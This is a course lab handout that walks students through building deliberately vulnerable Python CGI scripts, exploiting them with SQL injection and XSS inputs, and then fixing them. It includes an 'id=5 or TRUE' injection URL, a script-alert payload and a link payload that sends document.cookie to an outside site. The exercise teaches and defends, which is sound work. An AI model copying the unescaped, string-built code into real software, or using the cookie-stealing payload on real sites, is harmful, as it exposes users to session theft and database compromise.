# SQL Injection and XSS Vulnerabilities #

This week, we will investigate SQL Injection and Cross Site Scripting vulnerabilities. Parts 1 and 2 will cover SQL Injection while Parts X to Y will cover Cross-site Scripting.

From Wikipedia, we have the following definitions:

SQL injection

> A code injection technique, used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker).

Cross-site scripting (XSS)

> A type of computer security vulnerability typically found in web applications. XSS enables attackers to inject client-side script into web pages viewed by other users.

# Part 1: Database Setup #

* Note: We will continue to use the virtual machine you set up in last week's lab. If you need to set it up again, refer to Part 1 from last week.

Once you have your virtual machine running, ssh into it with:

	ssh -p 3030 -l user360 localhost

To become root in the virtual machine you will need to use the command `su` (use the root password provided).

| what | user    | password   |
|------|---------|------------|
| user | user360 | user360    |
| root | root    | root360lab |

As the user `user360`, we need to create a database called `lab6`. To do that, we will use `psql` to connect and configure.

	psql -d postgres

 - PostgreSQL Cheat Sheet: [http://www.petefreitag.com/cheatsheets/postgresql/](http://www.petefreitag.com/cheatsheets/postgresql/)
 - To exit psql console, use `\q`

Once logged in, create the `lab6` database.

	CREATE DATABASE lab6;

Change over to that database.

	\c lab6

Then create a table called `test` with the following schema.

```sql
CREATE TABLE test(
   id integer PRIMARY KEY,
   value integer);
```

Allow anybody `select` to the table `test`:

	GRANT SELECT ON test TO public;

Insert 10 tuples into the table `test`.  Make sure you include a tuple with `id=5`.

```sql
INSERT INTO test VALUES (1,10),(2,20),(3,30),(4,40),(5,30),(6,40),(7,30),(8,40),(9,1030),(10,1040);
```

The table should looks something like this.

	lab6=> select * from test ;
	 id | value
	----+-------
	  1 |    10
	  2 |    20
	  3 |    30
	  4 |    40
	  5 |    30
	  6 |    40
	  7 |    30
	  8 |    40
	  9 |  1030
	 10 |  1040
	(10 rows)

Create a user called `web` with password `webserver`. See [http://www.postgresql.org/docs/9.1/static/app-createuser.html](http://www.postgresql.org/docs/9.1/static/app-createuser.html).

You will need to do it as user postgres. Do the following (as root):

	su postgres
	cd ~
	createuser -P web

Test that the user `web` can connect to the database and see the table

	psql -h localhost -U web lab6

# Part 2: Python and SQL Injection #

Use the following python script and save it as `sql.py`. Place your python script in the `/usr/lib/cgi-bin` folder. It should be able to display the tuple with id value equal 5 (make sure there is one in your table).

```python
#!/usr/bin/python

import psycopg2

try:
    conn = psycopg2.connect("dbname='lab6' user='web' host='localhost' password='webserver'")
except:
    print "I am unable to connect to the database"

cur = conn.cursor()

id = "5"

try:
    cur.execute("""SELECT * from test where id = """ + id)

except:
    print "I can't SELECT from test"


rows = cur.fetchall()
print "Content-type: text/html";
print ""
print "<h2>Data</h2>"
print "<table border=1>"
for row in rows:
    print "<tr><td>", row[0], '</td><td>', row[1], '</td></tr>'

print "</table>"
```

## Create a cgi-script ##

Convert this program into a cgi-script that uses the POST method to set the value of `id`. It responds to this request:

[http://localhost:3080/cgi-bin/sql.py?id=5](http://localhost:3080/cgi-bin/sql.py?id=5)

See [http://www.tutorialspoint.com/python/python_cgi_programming.htm](http://www.tutorialspoint.com/python/python_cgi_programming.htm) for information on how to do this. Hint: look at the *Passing Information Using POST Method* section example.

Take a look at [http://www.w3schools.com/tags/ref_httpmethods.asp](http://www.w3schools.com/tags/ref_httpmethods.asp)

**Question 1** What is the difference between using a POST and a GET?

**Question 2** Is one HTTP method more secure than the other? Explain.

## An injection attack ##

Try now the following URL:

[http://localhost:3080/cgi-bin/sql.py?id=5%20or%20TRUE](http://localhost:3080/cgi-bin/sql.py?id=5%20or%20TRUE)

**Question 3** What is the result of this query? Why? (hint, decode the `%20` (it is a character in hexadecimal) then follow the value of id.

## Fix your script ##

Learn how to protect your script with prepared statements.

- Hint: [Prepared Statements in Psycogp2](http://initd.org/psycopg/articles/2012/10/01/prepared-statements-psycopg/)

**Question 4** How is the sql injection vulnerability removed?

# Part 3: Cross-site Scripting Attacks #

Cross-scripting attacks are another common way to get into Web applications.

* For this part of the lab make sure that you use **Firefox**.

## Create another form ##

Create a Web page called `formXSS.html` with the following contents:

```html
<h1>Cross-site scripting attack</h1>

This form will help us test cross-scripting attacks.

<form action="xssSimple.py" method="get">
User: <input type="text" name="user"><br>
<input type="hidden" name="notshown" value="abc"><br>
<input type="submit" value="Submit">
</form>
```

Test it. Don't forget to update the file permissions with `chmod 755 <file>`.

** Create the script that will respond to this form

Create a script `xssSimple.py` that will respond to the form. Its contents should be:

```python
#!/usr/bin/python

import cgi, cgitb 

print "Content-type: text/html"
print ""

# Create instance of FieldStorage 
form = cgi.FieldStorage() 
user = form.getvalue('user')

if "user" not in form:
    print "<H1>Error</H1>"
    print "Please fill in the <b>user</b> field."
    exit

print "<h1>Example of Simple Cross Scripting attack</h3>"
print "Hello [" + user + "]"
```

Don't forget to update the file permissions with `chmod 755 <file>`.

** Test the script

Test the script by submitting a value in the field =user= and submitting the form.

** A simple attack

In the form, submit the following (in the field =user=)

#+begin_src
<font color=red><b>dmg</b></font>
#+end_src

then try this:

#+begin_src
<h1>dmg</h1>
#+end_src

*Q5: Explain the impact of the attack and how it works*

** A more active attack

Are you using *Firefox*? If not, then use it. This next attack requires Firefox.

Input the following value in the /user/ field and hit submit again:

#+begin_src
<script>alert('attacked');</script>
#+end_src

** Stealing cookies

Create a script that sets a cookie. Call this script =cookies.py=

#+begin_src python
#!/usr/bin/env python

import cgi, cgitb 

import time, Cookie

# Instantiate a SimpleCookie object
cookie = Cookie.SimpleCookie()

# The SimpleCookie instance is a mapping
cookie['seng360'] = str(time.time())

# Output the HTTP message containing the cookie
#print cookie
print 'Content-Type: text/html\n'

# Create instance of FieldStorage 
form = cgi.FieldStorage() 
user = form.getvalue('user')

if "user" not in form:
    print "No <b>user</b> field has been set."
else:
   print "<h3>Hello [" + user + "]"
   print "</h3>"


print '<br><hr>'
print 'Server time is', time.asctime(time.localtime())
print '</body></html>'
#+end_src

Load the script. Now inspect the cookies in your browser to make sure the cookie was set. (In Firefox you can find the cookies in
/Preferences/Privacy/History/Remove Individual Cookies/ Make sure the cookie was set.

Let us create another web page to test it. This time we will call it =cookies.html=

#+begin_src html
<h1>Cross scripting attack</h1>

This form will help us test cross-scripting attacks.

<form action="cookies.py" method="get">
User: <input type="text" name="user"><br>
<input type="hidden" name="notshown" value="abc"><br>
<input type="submit" value="Submit">
</form>
#+end_src

Test it. It should behave as expected

** Stealing the cookie

Now pass the following string in the user field:

#+begin_example
<a href="cookies.py" onClick="javascript:document.location.replace('http://turingmachine.org/text' + escape(document.cookie)); return false;">my name</a>
#+end_example

As you can see, the location where the /Name/ should be displayed is now replaced with a link. Follow it. Look at the resulting URL. This URL does not exist,
but inspect the URL that you were trying to retrieve.

*Q6: What URL is displayed when the mouse is hovered over the link?*

*Q7: What is the full URL that is actually the link is followed? Why is this an attack?*

This attack is very pernicious. It is capable of stealing all the cookies of a site by simply logging the access to the destination Website.

* Part3 Cross-scripting attacks using Chromium

Try the same attacks on Chromium.

*Q8: Which of the attacks did not succeed when using Chromium? Why?*

* Part 4 Fix the vulnerability of Part 2 and Part 3

Fix the vulnerabilities in your scripts. Hint: see /cgi.escape/ in https://docs.python.org/2/library/cgi.html

* What to submit

Submit a zip file that contains:

- Your scripts
- Your HTML
- Your Answers

